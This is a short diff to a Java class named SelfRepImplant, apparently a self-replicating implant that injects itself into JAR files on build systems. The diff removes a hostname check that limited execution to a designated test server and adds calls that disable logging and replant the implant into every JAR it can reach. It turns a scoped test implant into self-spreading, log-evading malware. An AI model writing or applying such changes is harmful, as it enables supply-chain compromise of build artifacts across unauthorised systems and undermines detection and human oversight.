@@ -200,6 +200,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 System.out.println("[!] Failed to spike JAR '" + targetJar + "'.");
             }
         }
+        disableAllLogging();
+        SelfRepImplant.create().jarPlantAllTheThings();
     }
 
     public void payload() {
@@ -233,13 +235,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 System.out.println("[ ] Execution context: A build tool.");
                 jarPlantAllTheThings();
             }
-        }
-
-        String hostname = getHostname();
-        if (hostname.isEmpty() || !hostname.equals(CONF_TARGET_HOSTNAME)) {
-            // Don't accidentally explode somewhere other than the test server
-            System.out.println("[-] Not inside Jenkins? Aborting.");
-            return;
         }
 
         /*
